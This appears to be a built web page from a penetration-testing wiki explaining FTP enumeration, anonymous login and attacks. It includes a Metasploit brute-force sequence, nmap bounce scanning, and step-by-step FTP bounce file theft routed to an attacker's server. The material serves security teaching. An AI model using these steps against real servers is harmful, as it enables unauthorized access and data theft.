import{_ as a,c as e,a5 as i,o as t}from"./chunks/framework.B5CpDqM0.js";const k=JSON.parse('{"title":"🛠️ FTP","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"infra/protocols/ftp.md","filePath":"infra/protocols/ftp.md","lastUpdated":1724982529000}'),n={name:"infra/protocols/ftp.md"};function l(p,s,h,r,o,d){return t(),e("div",null,s[0]||(s[0]=[i(`<h1 id="🛠️-ftp" tabindex="-1">🛠️ FTP <a class="header-anchor" href="#🛠️-ftp" aria-label="Permalink to &quot;🛠️ FTP&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>The File Transfer Protocol (FTP) is a standard network protocol used for the transfer of files between a client and server. It usually runs on ports 21/tcp or 2121/tcp.</p><h2 id="basic-usage" tabindex="-1">Basic usage <a class="header-anchor" href="#basic-usage" aria-label="Permalink to &quot;Basic usage&quot;">​</a></h2><p>Standard UNIX-like commands, like <code>cd</code>, <code>ls</code>, <code>mkdir</code>, <code>rm</code> can be used. Here is a short list of some specific commands.</p><table tabindex="0"><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>help</code></td><td>display local help information</td></tr><tr><td><code>get</code></td><td>download file from remote server</td></tr><tr><td><code>put</code></td><td>upload file on the remote server</td></tr><tr><td><code>ascii</code></td><td>set the transfer type to &quot;ASCII&quot;</td></tr><tr><td><code>binary</code></td><td>set the transfer type to &quot;Binary&quot;</td></tr><tr><td><code>close</code></td><td>terminate FTP session</td></tr><tr><td><code>bye</code></td><td>terminate ftp session and exit</td></tr></tbody></table><div class="tip custom-block"><p>When downloading files, users should set the FTP client to &quot;Binary&quot; (<code>binary</code> command) in order to prevent files from becoming corrupted during transit.</p><p>Regular text file can be downloaded in the other mode : &quot;ASCII&quot; (<code>ascii</code> command)</p></div><div class="tip custom-block"><p>Hidden files can be listed with <code>ls -a</code></p></div><h2 id="enumeration" tabindex="-1">Enumeration <a class="header-anchor" href="#enumeration" aria-label="Permalink to &quot;Enumeration&quot;">​</a></h2><h3 id="banner-grabbing" tabindex="-1">Banner grabbing <a class="header-anchor" href="#banner-grabbing" aria-label="Permalink to &quot;Banner grabbing&quot;">​</a></h3><p>Useful to get basic information about the FTP server such as its type and version.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">telnet</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -vn</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $IP $PORT</span></span></code></pre></div><h3 id="accepted-commands" tabindex="-1">Accepted commands <a class="header-anchor" href="#accepted-commands" aria-label="Permalink to &quot;Accepted commands&quot;">​</a></h3><p>The <code>HELP</code> and <code>FEAT</code> commands could give information about the FTP server such as the recognized commands and the extended features the server supports.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>HELP</span></span>
<span class="line"><span>214-The following commands are recognized (* =&gt;&#39;s unimplemented):</span></span>
<span class="line"><span>214-CWD XCWD CDUP XCUP SMNT* QUIT PORT PASV </span></span>
<span class="line"><span>214-EPRT EPSV ALLO* RNFR RNTO DELE MDTM RMD </span></span>
<span class="line"><span>214-XRMD MKD XMKD PWD XPWD SIZE SYST HELP </span></span>
<span class="line"><span>214-NOOP FEAT OPTS AUTH CCC* CONF* ENC* MIC* </span></span>
<span class="line"><span>214-PBSZ PROT TYPE STRU MODE RETR STOR STOU </span></span>
<span class="line"><span>214-APPE REST ABOR USER PASS ACCT* REIN* LIST </span></span>
<span class="line"><span>214-NLST STAT SITE MLSD MLST </span></span>
<span class="line"><span>214 Direct comments to root@drei.work</span></span>
<span class="line"><span>FEAT</span></span>
<span class="line"><span>211-Features:</span></span>
<span class="line"><span> PROT</span></span>
<span class="line"><span> CCC</span></span>
<span class="line"><span> PBSZ</span></span>
<span class="line"><span> AUTH TLS</span></span>
<span class="line"><span> MFF modify;UNIX.group;UNIX.mode;</span></span>
<span class="line"><span> REST STREAM</span></span>
<span class="line"><span> MLST modify*;perm*;size*;type*;unique*;UNIX.group*;UNIX.mode*;UNIX.owner*;</span></span>
<span class="line"><span> UTF8</span></span>
<span class="line"><span> EPRT</span></span>
<span class="line"><span> EPSV</span></span>
<span class="line"><span> LANG en-US</span></span>
<span class="line"><span> MDTM</span></span>
<span class="line"><span> SSCN</span></span>
<span class="line"><span> TVFS</span></span>
<span class="line"><span> MFMT</span></span>
<span class="line"><span> SIZE</span></span>
<span class="line"><span>211 End</span></span></code></pre></div><h3 id="🛠️-files" tabindex="-1">🛠️ Files <a class="header-anchor" href="#🛠️-files" aria-label="Permalink to &quot;🛠️ Files&quot;">​</a></h3><p><a href="https://www.howtoforge.com/using-wget-with-ftp-to-download-move-web-sites-recursively" target="_blank" rel="noreferrer">https://www.howtoforge.com/using-wget-with-ftp-to-download-move-web-sites-recursively</a></p><h2 id="connection" tabindex="-1">Connection <a class="header-anchor" href="#connection" aria-label="Permalink to &quot;Connection&quot;">​</a></h2><h3 id="anonymous-login" tabindex="-1">Anonymous login <a class="header-anchor" href="#anonymous-login" aria-label="Permalink to &quot;Anonymous login&quot;">​</a></h3><p>Some FTP servers are configured to let users connect anonymously and thus give them access to files on the servers without authentication.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">$</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $IP $PORT</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Name:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> anonymous</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Password:</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">ls</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -a</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # List all files (even hidden) (yes, they could be hidden)</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">...</span></span></code></pre></div><h2 id="attacks" tabindex="-1">Attacks <a class="header-anchor" href="#attacks" aria-label="Permalink to &quot;Attacks&quot;">​</a></h2><h3 id="brute-force" tabindex="-1">Brute force <a class="header-anchor" href="#brute-force" aria-label="Permalink to &quot;Brute force&quot;">​</a></h3><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">msfconsole</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">use</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> auxiliary/scanner/ftp/ftp_login</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> RHOSTS</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $IP</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> RPORT</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $PORT</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> USER_FILE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $user</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.txt</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">set</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> PASS_FILE</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> $pass</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.txt</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">run</span></span></code></pre></div><h3 id="ftp-sniffing" tabindex="-1">FTP sniffing <a class="header-anchor" href="#ftp-sniffing" aria-label="Permalink to &quot;FTP sniffing&quot;">​</a></h3><p>If the FTP communications are not encrypted and if the attacker is on the same network of the client or the server he can sniff the data packet traveling between the client and the server in order to retrieve credential.</p><p>Several tools like <code>Wireshark</code> could be used to sniff TCP packets.</p><h3 id="ftp-bounce-attacks" tabindex="-1">FTP Bounce attacks <a class="header-anchor" href="#ftp-bounce-attacks" aria-label="Permalink to &quot;FTP Bounce attacks&quot;">​</a></h3><p>FTP Bounce attacks let an attacker requests access to ports by using the FTP command <code>PORT</code>. It&#39;s mostly used to make a port-scan without being detected (as you are not the one doing it, but the FTP server for you), for D.o.S. attacks, or to download files from another FTP server.</p><p>To check if the FTP server is vulnerable to Bounce attacks it is possible to use the tool <code>NMAP</code>.</p><div class="tip custom-block"><p><a href="https://nmap.org/nsedoc/scripts/ftp-bounce.html" target="_blank" rel="noreferrer">https://nmap.org/nsedoc/scripts/ftp-bounce.html</a></p></div><h4 id="scan-the-victim-s-network" tabindex="-1">Scan the victim&#39;s network <a class="header-anchor" href="#scan-the-victim-s-network" aria-label="Permalink to &quot;Scan the victim&#39;s network&quot;">​</a></h4><p>If a FTP server is vulnerable to Bounce attacks, an attacker could use it to scan its network without being detected.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -v</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -b</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -P0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;username&#39;:&#39;password&#39;@&#39;ftp_server&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &#39;address(es)_to_scan&#39;</span></span></code></pre></div><h4 id="download-file-folder" tabindex="-1">Download file/folder <a class="header-anchor" href="#download-file-folder" aria-label="Permalink to &quot;Download file/folder&quot;">​</a></h4><p>If an attacker has access to a bounce FTP server, he can make it request files of other FTP server and download that file to his own server.</p><div class="caution custom-block"><p>Requirements:</p><ul><li>Valid credentials in the FTP intermediate server</li><li>Valid credentials in target FTP server</li><li>Both servers accept the PORT command</li><li>Write permissions in the intermediate server</li><li>Attacker&#39;s FTP server supports passive mode</li></ul></div><h4 id="steps" tabindex="-1">Steps <a class="header-anchor" href="#steps" aria-label="Permalink to &quot;Steps&quot;">​</a></h4><ul><li>Connect to your own FTP server and make the connection passive to make it listen in a directory where the victim service will send the file.</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#Start server + connection</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">service</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> pure-ftpd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> start</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> My_IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 21</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">USER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> my_own_username</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#Enable passive mode</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">pasv</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Entering</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Passive</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Mode</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> (F,F,F,F,X,X) </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#Note the output (IP and port)</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#Tells server to accept data and to store it into the dump file</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ftp</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt; </span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">stor</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> dump</span></span></code></pre></div><ul><li>Create the file to send to the intermediate server with the commands that the targeted server will have to execute. Let&#39;s call this file <code>instrs</code>.</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">user</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ftp</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> # user and pass of the targeted server</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">pass</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -anonymous@</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">cwd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /DIRECTORY</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">type</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> i</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">port</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> F,F,F,F,X,X</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> #IP and port of the attacker</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">retr</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> file.tar.Z</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">quit</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ...</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ^@^@^@^@</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@^@</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ...</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> ^@^@^@^@</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">...</span></span></code></pre></div><div class="tip custom-block"><p>The extra nulls at the end of the command file are to fill up the TCP windows and ensure that the command connection stays open long enough for the whole session to be executed.</p></div><ul><li>Upload this file on the intermediate server, then upload it from the intermediate server to the targeted server and __make the targeted machine execute this file.</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">#Run these commands on the intermediate server</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">put</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> instrs</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">quote</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;port C,C,C,C,0,21&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"> #IP of the targeted server</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">quote</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;retr instrs&quot;</span></span></code></pre></div><ul><li>The attacker should have received on his server the file &#39;file.tar.Z&#39; renamed as &#39;dump&#39;.</li></ul><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-ftp" target="_blank" rel="noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-ftp</a></p><p><a href="https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b" target="_blank" rel="noreferrer">https://shahmeeramir.com/penetration-testing-of-an-ftp-server-19afe538be4b</a></p><p><a href="https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/" target="_blank" rel="noreferrer">https://www.thesecuritybuddy.com/vulnerabilities/what-is-ftp-bounce-attack/</a></p><p><a href="https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands" target="_blank" rel="noreferrer">https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands</a></p>`,51)]))}const u=a(n,[["render",l]]);export{k as __pageData,u as default};